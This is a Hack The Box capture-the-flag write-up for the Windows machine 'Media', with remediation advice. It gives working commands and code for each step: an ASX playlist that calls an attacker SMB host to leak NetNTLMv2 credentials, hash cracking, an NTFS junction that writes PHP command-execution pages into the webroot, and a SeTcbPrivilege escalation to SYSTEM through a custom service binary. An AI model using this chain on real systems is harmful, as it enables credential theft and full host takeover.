---
title: 'HTB Media: Complete Evidence-Led Walkthrough'
description: A media-review SMB authentication leak led to SSH access, junction-assisted webroot writes and a SeTcbPrivilege SYSTEM escalation.
date: 2026-11-12
category: Windows / Web Security
difficulty: Medium
tags:
- Hack The Box
- Windows
- SMB
- NetNTLMv2
- NTFS Junction
- PHP
- SeTcbPrivilege
published: true
slug: htb-media
---

# Overview

**Machine:** Media  
**Platform:** Hack The Box  
**Publication format:** htb-media.md  

The target reviewed uploaded playlists with Windows Media Player. That background behavior could be induced to authenticate to an attacker-controlled SMB share, providing the initial reusable local credential.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

**Target:** Media\
**Difficulty:** Medium\
**Platform:** Windows\
**Target IP during this run:** `10.129.89.157`\
**Hostname:** `MEDIA`\
**Operating system:** Windows Server (build `10.0.20348.4052`, as
reported by the target)\
**Status:** User and Administrator/root flags obtained\
**Assessment date:** 24--25 October 2026\
**Approach:** Manual enumeration, evidence-led exploitation, no
published walkthrough used during the solve

> **Credential handling:** Recovered lab passwords and hashes are redacted in this public edition; the associated operations remain documented.

------------------------------------------------------------------------

### Executive summary

Media is a Windows machine hosting a custom PHP application on an
Apache/XAMPP stack. The application accepts uploaded files and places
them in a predictable directory under `C:\Windows\Tasks\Uploads`. A
background `ReviewService` reads a queue file and opens submitted media
in Windows Media Player.

The initial foothold came from an ASX playlist referencing an
attacker-controlled SMB share. When the automated review process opened
the playlist, the target attempted SMB authentication. Responder
captured a NetNTLMv2 challenge-response for `MEDIA\enox`; cracking it
recovered the account password, which allowed SSH access.

The privilege-escalation chain had two distinct stages:

1.  **NTFS junction abuse to PHP code execution:** The upload directory
    was writable by `Everyone`, and the upload path was derived from an
    MD5 hash of applicant-controlled fields. A junction redirected that
    predictable directory into Apache's webroot. Uploading a harmless
    text file confirmed that PHP wrote through the junction. A PHP proof
    then established execution as `NT AUTHORITY\LOCAL SERVICE`.
2.  **Abuse of `SeTcbPrivilege` to execute as SYSTEM:** The Apache PHP
    process's token contained `SeTcbPrivilege` (disabled, but present).
    TcbElevation was used to register a service running as
    `LocalSystem`. The first attempt returned service error 1053 because
    `cmd.exe` was not a proper service executable. A small service
    binary that correctly registered with the Service Control Manager
    then wrote `Execution identity: SYSTEM` to a proof file. A final
    version copied the Administrator flag to the upload directory, where
    it could be read from the `enox` SSH session.

#### Attack-chain overview

``` text
HTTP enumeration
    |
    v
Unrestricted media upload
    |
    v
ASX playlist references attacker SMB share
    |
    v
Automated ReviewService opens playlist in Windows Media Player
    |
    v
NetNTLMv2 capture for MEDIA\enox
    |
    v
Password cracking -> SSH as enox
    |
    v
Predictable upload directory + Everyone: Full Control
    |
    v
NTFS junction -> C:\xampp\htdocs
    |
    v
PHP command execution as NT AUTHORITY\LOCAL SERVICE
    |
    v
SeTcbPrivilege abuse via TcbElevation
    |
    v
LocalSystem service execution
    |
    v
Administrator/root flag recovered
```

------------------------------------------------------------------------

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Reconnaissance

#### Full TCP port scan

The first scan initially failed because the `scans` output directory did
not exist. After creating the directory, the full TCP scan completed.

``` bash
export IP=10.129.89.157
mkdir -p <REDACTED> evidence

sudo nmap -p- --min-rate 1000 -T4 -Pn -n \
  "$IP" -oA scans/tcp-full
```

Open ports:

        Port State   Service
  ---------- ------- ---------------
      22/tcp Open    SSH
      80/tcp Open    HTTP
    3389/tcp Open    Microsoft RDP

The other 65,532 TCP ports were reported as filtered.

#### Service/version detection

``` bash
sudo nmap -sC -sV -Pn -n \
  -p 22,80,3389 \
  "$IP" -oA scans/tcp-services
```

Relevant results:

  ------------------------------------------------------------------------
                          Port Service/version       Notes
  ---------------------------- --------------------- ---------------------
                        22/tcp OpenSSH for Windows   Potential
                               9.5                   authenticated
                                                     foothold

                        80/tcp Apache 2.4.56, Win64, Custom PHP web
                               OpenSSL 1.1.1t, PHP   application
                               8.1.17                

                      3389/tcp Microsoft Terminal    RDP available
                               Services              
  ------------------------------------------------------------------------

RDP's NTLM information identified the host and domain as `MEDIA`, with
Windows build `10.0.20348`. Nmap reported approximately 1 minute 29
seconds of clock skew.

#### Web application

The web root presented a site titled **ProMotion Studio**. The page
contained an applicant submission form asking for first name, last name,
email, and a video upload. Static JavaScript was a standard Bootstrap
Agency script and did not reveal a client-side exploit.

The form's upload field was named `fileToUpload`.

A harmless text file was submitted first. The server returned a success
alert:

``` text
Your application was successfully submitted.
Our HR shall review your video and get back to you.
```

The same behavior was observed with a `.php` file. This suggested that
the application was not enforcing a meaningful video-only extension
allowlist. Acceptance alone did not prove that the file was stored or
executable, so those properties were investigated separately.

Example harmless upload:

``` bash
echo 'CPTS harmless validation test' > probe.txt

curl -sS "http://$IP/" \
  -F "firstname=Test" \
  -F "lastname=Applicant" \
  -F "email=test@example.com" \
  -F "fileToUpload=@probe.txt;type=text/plain" \
  -F "submit=Upload File"
```

A request without a file did not produce the same success alert.

#### Directory-enumeration correction

An initial `ffuf` run returned `http:///FUZZ` and every request failed.
The cause was an empty `$IP` variable in that shell, not a target-side
filtering behavior. Re-exporting the target fixed the URL.

``` bash
export IP=10.129.89.157

ffuf -u "http://$IP/FUZZ" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -ac -t 25 -rate 100 \
  -o scans/directories.json
```

**Lesson:** Confirm the expanded target URL before interpreting a
scanner's results.

------------------------------------------------------------------------

## Analysis

The escalation involved two distinct trust-boundary failures. The first was a predictable Everyone-writable upload directory that allowed an NTFS junction to redirect application writes into Apache's webroot. The second was the PHP service token's SeTcbPrivilege, which permitted a properly registered service to execute as LocalSystem. An early cmd.exe service failed with error 1053 and did not establish SYSTEM execution.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Initial access --- ASX to NetNTLMv2

#### Why ASX was interesting

The application explicitly asked for Windows Media Player-compatible
video submissions and said HR would review them. An ASX file is a
Windows Media redirector playlist and can reference a remote media
resource.

The test playlist pointed to a remote SMB share controlled by the
attacker. The relevant structure was:

``` xml
<ASX version="3.0">
  <TITLE>Introduction Video</TITLE>
  <ENTRY>
    <TITLE>Applicant Introduction</TITLE>
    <REF HREF="file://\\ATTACKER_IP\share\intro.wmv" />
  </ENTRY>
</ASX>
```

`ATTACKER_IP` represents the attacker's reachable VPN address. In the
captured authentication data, the requested service was
`cifs/10.10.15.31`.

The important behavioral chain was not simply "upload a file": the web
application queued the submission, and its review service opened the
submitted path in Windows Media Player. Processing the playlist caused
an outbound SMB authentication attempt.

#### Upload the playlist

The ASX file was submitted using the same form as the harmless test
files:

``` bash
curl -sS "http://$IP/" \
  -F "firstname=Test" \
  -F "lastname=Applicant" \
  -F "email=test@example.com" \
  -F "fileToUpload=@introduction.asx;type=video/x-ms-asf" \
  -F "submit=Upload File"
```

Responder captured the following NetNTLMv2 response for `MEDIA\enox`:

``` text
[REDACTED_NETNTLM_CHALLENGE_RESPONSE]
```

This is a NetNTLMv2 challenge-response, **not** the account's NT hash.
It must be cracked offline; it cannot be passed directly to an NTLM
pass-the-hash workflow.

Save the captured line to a file such as `enox.hash`, then crack it with
Hashcat mode 5600:

``` bash
hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt
hashcat -m 5600 enox.hash --show
```

The recovered lab credential was:

``` text
Username: MEDIA\enox
Password: [REDACTED]
```

#### Authenticate over SSH

``` bash
ssh enox@"$IP"
```

This provided an interactive Windows shell as `MEDIA\enox`.

**Initial-access finding:** The web application accepted a playlist that
caused an automated Windows process to access an attacker-controlled SMB
resource. The resulting NetNTLMv2 challenge-response was crackable,
exposing a valid local account credential.

------------------------------------------------------------------------

### Initial Windows enumeration

#### Identity, groups, and privileges

From the SSH shell:

``` cmd
whoami /all
hostname
whoami /priv
net user enox
net localgroup administrators
```

Observed identity:

``` text
User: MEDIA\enox
SID:  S-1-5-21-161898231-563177350-3296918735-1000
Host: MEDIA
```

`enox` belonged to `BUILTIN\Users`; the local Administrators group
listed only `Administrator`.

The token's relevant privileges were:

``` text
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

`SeImpersonatePrivilege` and `SeDebugPrivilege` were absent. That ruled
out immediately pursuing common impersonation-token techniques such as
JuicyPotato/PrintSpoofer from this token.

`systeminfo` returned Access Denied. This was a limitation on that
command, not evidence that the host was inaccessible.

#### XAMPP discovery

The installation was found at `C:\xampp`:

``` cmd
dir /a C:\xampp
dir /a C:\xampp\htdocs
```

The web root contained:

``` text
C:\xampp\htdocs\
    assets\
    css\
    js\
    index.php
```

`C:\xampp\passwords.txt` contained XAMPP's generic default-password
reference, including the familiar MySQL root-without-a-password example
and an old WebDAV example. These were installation notes; no evidence
established that those defaults were active, and they were not used in
the attack.

The PHP upload handler was located with:

``` cmd
findstr /s /n /i /p "move_uploaded_file fileToUpload upload_dir" C:\xampp\htdocs\*.php
```

The relevant code used `move_uploaded_file()` and accepted the uploaded
file from `$_FILES["fileToUpload"]`.

#### Upload destination and queue

Source review identified the upload directory:

``` php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
```

The destination subdirectory was predictable because its name was
calculated from applicant-controlled values:

``` php
$folderName = md5($firstname . $lastname . $email);
```

The application appended a queue entry to `todo.txt`:

``` php
$todoFile = $uploadDir . 'todo.txt';

$todoContent = "Filename: " . $originalFilename .
               ", Random Variable: " . $folderName . "\n";

file_put_contents($todoFile, $todoContent, FILE_APPEND);
```

The filename was also sanitized for storage with a character filter
equivalent to:

``` php
$sanitizedFilename = preg_replace(
    "/[^a-zA-Z0-9._]/", "", $originalFilename
);
```

That detail mattered later: a hyphenated upload named
`junction-proof.txt` was saved as `junctionproof.txt`. The first HTTP
request to `/junction-proof.txt` returned 404; requesting
`/junctionproof.txt` returned the expected content.

#### Confirm the upload queue

The directory contained the submitted test files and `todo.txt`:

``` text
C:\Windows\Tasks\Uploads\
    [REDACTED_HEX]\
        introduction.asx
        introduction.lnk
        probe.mp4
        probe.php
        probe.txt
    todo.txt
```

`C:\Windows\Tasks\Uploads` had this important ACL:

``` text
Everyone:(OI)(CI)(F)
```

`todo.txt` was writable by `Everyone` and `MEDIA\enox`. A controlled
test showed that a successful upload appended queue entries; after
roughly 30 seconds, the file returned to zero bytes.

The queue's lifecycle was initially only a hypothesis. The service
script found next explained it.

------------------------------------------------------------------------

### Identify the automated review service

The process listing showed `nssm.exe` and PowerShell. Querying
`Get-ScheduledTask` failed with Access Denied, and `tasklist /v` was
also restricted. Instead of treating those errors as blockers, the
service registry configuration was enumerated.

The service configuration identified:

``` text
Service     : ReviewService
RunAs       : .\enox
Application : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Arguments   : -ExecutionPolicy Bypass -NoProfile -File
              C:\Users\enox\Documents\review.ps1
```

The script's relevant logic was:

``` powershell
while ($True) {
    if ((Get-Content -Path $todofile) -eq $null) {
        Write-Host "Todo is empty."
        Sleep 60
    }
    else {
        $result = Get-Values -FilePath $todofile
        $filename = $result.FileName
        $randomVariable = $result.RandomVariable

        Start-Process -FilePath $mediaPlayerPath `
          -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"

        Start-Sleep -Seconds 15

        $mediaPlayerProcess = Get-Process -Name "wmplayer" `
          -ErrorAction SilentlyContinue

        if ($mediaPlayerProcess -ne $null) {
            Stop-Process -Name "wmplayer" -Force
        }

        UpdateTodo -FilePath $todofile
        Sleep 15
    }
}
```

This established the complete initial-access mechanism:

1.  PHP stored the upload and appended its filename plus directory
    identifier to `todo.txt`.
2.  `ReviewService`, running as `enox`, read the queue.
3.  The script opened the submitted file in Windows Media Player.
4.  It waited, terminated the media player if still running, and updated
    the queue.

The service was **not** the privilege-escalation boundary: its
configured identity was `.\enox`. The more valuable identity was
Apache's service account, which executed PHP requests.

------------------------------------------------------------------------

### NTFS junction --- arbitrary file write into the webroot

#### Confirm the relevant permissions and service identity

The XAMPP directories showed that `BUILTIN\Users` had read/execute,
while `NT AUTHORITY\LOCAL SERVICE` had full control over the webroot:

``` text
C:\xampp\htdocs
    NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F)
    BUILTIN\Users:(I)(OI)(CI)(RX)
```

The upload directory was writable by `Everyone`. Since the upload folder
name was predictable, the upload path could be redirected with an NTFS
junction.

#### Calculate the directory name

For the chosen applicant details:

``` text
First name: Junction
Last name:  Proof
Email:      junction-proof@example.com
```

The folder hash was calculated using the same concatenation as the PHP
code:

``` powershell
$first = "Junction"
$last  = "Proof"
$email = "junction-proof@example.com"

$md5 = [Security.Cryptography.MD5]::Create()
$folder = -join (
    $md5.ComputeHash(
        [Text.Encoding]::UTF8.GetBytes("$first$last$email")
    ) | ForEach-Object { $_.ToString("x2") }
)

$folder
```

Output:

``` text
[REDACTED_HEX]
```

The destination did not already exist.

#### Create the junction

The upload subdirectory was redirected to the Apache webroot:

``` cmd
mklink /J C:\Windows\Tasks\Uploads\[REDACTED_HEX] C:\xampp\htdocs
```

Verification in PowerShell showed:

``` text
FullName : C:\Windows\Tasks\Uploads\[REDACTED_HEX]
LinkType : Junction
Target   : {C:\xampp\htdocs}
```

#### Prove the redirected write

A harmless file was uploaded using exactly the applicant details that
generated the junction:

``` bash
printf 'MEDIA_JUNCTION_PROOF\n' > junction-proof.txt

curl -sS -o /dev/null -w "HTTP: %{http_code}\n" \
  "http://$IP/" \
  -F "firstname=Junction" \
  -F "lastname=Proof" \
  -F "email=junction-proof@example.com" \
  -F "fileToUpload=@junction-proof.txt" \
  -F "submit=Upload File"
```

Because the filename sanitizer removed hyphens, the file was requested
using its sanitized name:

``` bash
curl -i "http://$IP/junctionproof.txt"
```

The server returned:

``` text
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 21

MEDIA_JUNCTION_PROOF
```

This was decisive evidence: the PHP upload handler wrote through the
junction into `C:\xampp\htdocs`, and Apache served the resulting file.

#### Convert the arbitrary file write into PHP execution

A small PHP file was uploaded through the same junction. Its purpose was
to run `whoami /all` and return the output:

``` php
<?php
header("Content-Type: text/plain");
echo "Execution identity:\n";
system("whoami /all");
?>
```

After upload, it was requested directly:

``` bash
curl -sS "http://$IP/identity.php"
```

The response identified the PHP execution account as:

``` text
nt authority\local service
SID: S-1-5-19
```

The token included:

``` text
SeTcbPrivilege                Act as part of the operating system      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeCreateGlobalPrivilege       Create global objects                    Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set          Disabled
SeTimeZonePrivilege           Change the time zone                     Disabled
```

`SeTcbPrivilege` was present, although disabled.
`SeImpersonatePrivilege` was not present.

**Privilege-escalation boundary:** The junction gave a route from
`enox`-controlled upload inputs to PHP execution in Apache's
`LOCAL SERVICE` process. The next stage targeted the unusually powerful
privilege in that process token.

------------------------------------------------------------------------

### `SeTcbPrivilege` abuse --- SYSTEM execution

#### Build TcbElevation

The TcbElevation proof of concept was downloaded from the source used
during the engagement:

-   https://gist.github.com/antonioCoco/[REDACTED_HEX]

It was cross-compiled on Parrot:

``` bash
x86_64-w64-mingw32-g++ TcbElevation.cpp \
  -o TcbElevation.exe \
  -static -DUNICODE -D_UNICODE -municode \
  -ladvapi32 -lsecur32
```

The executable was uploaded through the existing junction into the
webroot.

#### First attempt: service creation succeeded, but the proof failed

The first test attempted to run a normal command through a service:

``` text
TcbElevation.exe TcbProof
  "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Tasks\Uploads\tcbproof.txt"
```

The PHP launcher returned:

``` text
Error starting service 1053
```

The file existed but was empty. From the `enox` shell, querying the
service through `sc.exe` returned Access Denied. However, the registry
entry was readable:

``` text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcbProof

Type        REG_DWORD       0x10
Start       REG_DWORD       0x3
ImagePath   REG_EXPAND_SZ   C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Tasks\Uploads\tcbproof.txt
ObjectName  REG_SZ          LocalSystem
```

This established that a service configured to run as `LocalSystem` had
been registered, but the command's execution was not proven. Error 1053
was consistent with using `cmd.exe`, which is not itself a proper
Windows service executable.

**Troubleshooting lesson:** Service creation, service start, and
successful execution of the intended command are separate events. The
error message alone did not prove escalation.

#### Build a proper service proof binary

A small Windows service executable was created to register with the
Service Control Manager, report `SERVICE_RUNNING`, write its execution
identity, and then stop. The relevant code was:

``` c
#include <windows.h>
#include <stdio.h>

static SERVICE_STATUS_HANDLE serviceHandle;

void WINAPI ServiceHandler(DWORD control) {
    (void)control;
}

void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
    (void)argc;
    (void)argv;

    serviceHandle = RegisterServiceCtrlHandlerA(
        "TcbProbe2", ServiceHandler
    );

    if (!serviceHandle) return;

    SERVICE_STATUS status = {0};
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    status.dwControlsAccepted = 0;

    SetServiceStatus(serviceHandle, &status);

    char username[256] = "UNKNOWN";
    DWORD length = sizeof(username);

    if (!GetUserNameA(username, &length)) {
        snprintf(username, sizeof(username),
                 "GetUserNameA error: %lu", GetLastError());
    }

    FILE *f = fopen(
        "C:\\Windows\\Tasks\\Uploads\\TcbProbe2.txt", "w"
    );

    if (f) {
        fprintf(f, "Execution identity: %s\n", username);
        fclose(f);
    }

    Sleep(2000);

    status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(serviceHandle, &status);
}

int main(void) {
    SERVICE_TABLE_ENTRYA table[] = {
        {"TcbProbe2", ServiceMain},
        {NULL, NULL}
    };

    return StartServiceCtrlDispatcherA(table) ? 0 : 1;
}
```

It was compiled on Parrot:

``` bash
x86_64-w64-mingw32-gcc TcbProbe2.c \
  -o TcbProbe2.exe \
  -static -ladvapi32
```

The PHP launcher invoked TcbElevation with the service name and the
uploaded service executable:

``` php
<?php
header("Content-Type: text/plain");

passthru(
    '"C:\xampp\htdocs\TcbElevation.exe" TcbProbe2 ' .
    '"C:\xampp\htdocs\TcbProbe2.exe" 2>&1'
);
?>
```

Both files were uploaded using the same junction and applicant details,
and the PHP launcher was requested:

``` bash
curl -i --max-time 90 "http://$IP/runprobe.php"
```

#### Confirm SYSTEM

From the SSH session:

``` powershell
Get-Content C:\Windows\Tasks\Uploads\TcbProbe2.txt
```

The result was:

``` text
Execution identity: SYSTEM
```

This was the decisive proof of SYSTEM code execution. The service ran
under LocalSystem, even though the initial PHP process was running as
Local Service.

#### Read the Administrator flag

A final service binary was created from the working service proof by
changing the service name to `TcbRoot` and adding a file-copy operation:

``` c
CopyFileA(
    "C:\\Users\\Administrator\\Desktop\\root.txt",
    "C:\\Windows\\Tasks\\Uploads\\rootproof.txt",
    FALSE
);
```

The binary was compiled:

``` bash
x86_64-w64-mingw32-gcc TcbRoot.c \
  -o TcbRoot.exe \
  -static -ladvapi32
```

A PHP launcher invoked it through TcbElevation:

``` php
<?php
header("Content-Type: text/plain");

passthru(
    '"C:\xampp\htdocs\TcbElevation.exe" TcbRoot ' .
    '"C:\xampp\htdocs\TcbRoot.exe" 2>&1'
);
?>
```

After uploading `TcbRoot.exe` and `runroot.php` through the existing
junction, the launcher was executed:

``` bash
curl -i --max-time 90 "http://$IP/runroot.php"
```

The copied flag was then read from the SSH session:

``` powershell
Get-Content C:\Windows\Tasks\Uploads\rootproof.txt
```

**Result:** The Administrator/root flag was recovered. Its value is not
reproduced in this report because it was not included in the
conversation transcript.

------------------------------------------------------------------------

### Troubleshooting notes and lessons learned

-   **Missing `scans/` directory:** Nmap could not open its output file
    until the directory existed.
-   **Empty `$IP` variable:** FFUF generated `http:///FUZZ`; the
    resulting failures were local command setup errors, not target
    filtering.
-   **Upload success is not execution proof:** A success alert showed
    that the application accepted the request, not that a file was
    stored or executable.
-   **Filename normalization mattered:** The sanitizer removed `-`, so
    `junction-proof.txt` became `junctionproof.txt`.
-   **The queue behavior was explained by source:** `todo.txt` was
    populated by PHP and cleared by the review script's `UpdateTodo`
    function.
-   **ReviewService was not the escalation boundary:** It ran as
    `.\enox`, not SYSTEM.
-   **Task/process enumeration was restricted:** `Get-ScheduledTask`,
    `tasklist /v`, and service-control queries returned Access Denied in
    places. Registry-based service inspection still exposed the needed
    configuration.
-   **Error 1053 was not a successful proof:** The initial service was
    registered as LocalSystem, but `cmd.exe` did not behave as a proper
    service. The purpose-built service binary provided an unambiguous
    proof.
-   **Disabled is not the same as absent:** `SeTcbPrivilege` appeared in
    the Local Service token as disabled. It was still available to the
    exploitation path used here.
-   **Prove each boundary separately:** The engagement established file
    upload, arbitrary webroot write, PHP execution identity, service
    creation, SYSTEM execution, and flag retrieval as separate
    observable steps.

------------------------------------------------------------------------

## Impact

The source documents SSH access as enox, PHP execution as LOCAL SERVICE, proof of SYSTEM execution through a dedicated service binary, and retrieval of the Administrator flag.

### Findings and impact

#### Finding 1 --- Unrestricted upload combined with automated media processing

**Impact:** An unauthenticated user could submit a crafted ASX playlist
that the target later opened in Windows Media Player. The playlist
induced outbound SMB authentication and exposed a crackable NetNTLMv2
response for `MEDIA\enox`.

**Evidence:** - `.txt`, `.php`, and `.asx` uploads received the success
response. - The file was saved under `C:\Windows\Tasks\Uploads`. - The
`ReviewService` script opened queued paths using Windows Media Player. -
Responder captured a NetNTLMv2 response for `MEDIA\enox`. - The response
was cracked to recover the SSH credential.

**Remediation:** - Enforce a strict allowlist of file extensions and
independently validate file content. - Do not automatically open
untrusted uploads in interactive desktop applications. - Run media
processing in a sandbox with no access to user credentials. - Block
outbound SMB from servers to untrusted networks. - Prefer Windows
policies that restrict or disable NTLM where feasible.

#### Finding 2 --- Predictable upload path and NTFS junction abuse

**Impact:** An attacker able to create a junction at the predictable
upload location could redirect the PHP file write into Apache's webroot.
This converted a file upload into PHP code execution.

**Evidence:** - Upload path: `C:\Windows\Tasks\Uploads\<MD5>`. - The
hash was derived from applicant-controlled first name, last name, and
email values. - `Everyone` had Full Control over the upload directory. -
The junction target was `C:\xampp\htdocs`. - A harmless uploaded text
file was served from the webroot. - A PHP proof executed as
`NT AUTHORITY\LOCAL SERVICE`.

**Remediation:** - Store uploads in a directory outside the webroot and
configure the web server not to execute files from upload locations. -
Use restrictive ACLs; do not grant `Everyone` Full Control to upload
directories. - Avoid predictable attacker-controlled paths for
security-sensitive filesystem operations. - Validate canonical paths and
explicitly detect/reject reparse points or junctions before writing. -
Use server-generated opaque identifiers rather than an MD5 of applicant
data. - Apply consistent filename normalization and validation.

#### Finding 3 --- Dangerous `SeTcbPrivilege` in the Apache execution token

**Impact:** PHP code execution as `LOCAL SERVICE` exposed a token
containing `SeTcbPrivilege`. TcbElevation was able to create a service
configured to run as LocalSystem. A correctly implemented service binary
confirmed SYSTEM execution and enabled retrieval of the Administrator
flag.

**Evidence:** - `whoami /all` from the PHP endpoint identified
`NT AUTHORITY\LOCAL SERVICE`. - The token listed `SeTcbPrivilege` as
present but disabled. - Registry data for the initial service showed
`ObjectName = LocalSystem`. - The purpose-built service proof wrote
`Execution identity: SYSTEM`. - The Administrator flag was copied to the
writable upload directory and retrieved.

**Remediation:** - Remove `SeTcbPrivilege` from the Apache/Local Service
execution context unless there is a strictly justified operational
requirement. - Run web applications with the minimum required privileges
and isolate them from operating-system authentication functions. -
Prevent web-facing worker processes from registering or manipulating
privileged services. - Audit service-creation events and unexpected
LocalSystem service registrations. - Separate web serving, media
processing, and administrative tasks into different identities and
security boundaries.

#### Combined impact

The issues compounded into full host compromise:

1.  The upload workflow exposed a crackable account credential.
2.  The predictable upload path and permissive ACLs enabled a
    junction-based webroot write.
3.  PHP execution exposed the powerful `SeTcbPrivilege`.
4.  The privilege was used to run code as LocalSystem and retrieve the
    Administrator flag.

The primary security failure was not one isolated weak setting; it was
the combination of unsafe upload processing, weak filesystem boundaries,
and an excessive privilege in the web server's execution token.

------------------------------------------------------------------------

### Evidence checklist

-------------------------------------------------------------------------------
  Stage                               Evidence
  ----------------------------------- -------------------------------------------
  Reconnaissance                      `scans/tcp-full.*`, `scans/tcp-services.*`

  Web upload behavior                 Upload responses for `.txt`, `.php`, `.asx`

  NTLM capture                        `enox.hash` / Responder output

  Credential recovery                 Hashcat result for `MEDIA\enox`

  Initial access                      SSH shell as `MEDIA\enox`

  Source analysis                     `C:\xampp\htdocs\index.php`, `review.ps1`

  Upload queue                        `C:\Windows\Tasks\Uploads\todo.txt` and
                                      queued upload directory

  Junction                            `Get-Item` output showing target
                                      `C:\xampp\htdocs`

  Arbitrary file write                HTTP 200 and body `MEDIA_JUNCTION_PROOF`

  PHP execution                       `identity.php` output showing
                                      `NT AUTHORITY\LOCAL SERVICE` and
                                      `SeTcbPrivilege`

  Service registration                `TcbProof` registry entry showing
                                      `ObjectName = LocalSystem`

  SYSTEM proof                        `TcbProbe2.txt` containing
                                      `Execution identity: SYSTEM`

  Administrator flag                  `rootproof.txt` copied from
                                      `C:\Users\Administrator\Desktop\root.txt`
  -------------------------------------------------------------------------------

------------------------------------------------------------------------

### Final summary

Media was solved by following the behavior of the application rather
than treating the upload form as a generic upload vulnerability.

The ASX hypothesis worked because the file was not simply stored: it was
opened by an automated Windows Media Player review process. That leaked
a crackable NetNTLMv2 response and provided SSH access as `enox`.

The most important escalation discovery was the predictable upload
directory combined with permissive ACLs. The NTFS junction redirected
PHP's file write into the webroot, producing command execution as Local
Service. From there, the available `SeTcbPrivilege` enabled a
TcbElevation-based service execution path. A purpose-built service
binary verified SYSTEM execution, and the Administrator flag was
recovered.

**Final result: Media fully compromised --- user access and LocalSystem
execution confirmed, Administrator/root flag obtained.**

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

The central control failures were an upload-processing workflow that allowed attacker-triggered network authentication; a predictable upload path and loose filesystem permissions that enabled junction-based writes into the webroot; and a service token with SeTcbPrivilege. Remediation should validate and isolate uploaded media, prevent privileged services from following user-created reparse points into executable directories, restrict upload write permissions, and remove unneeded token privileges.
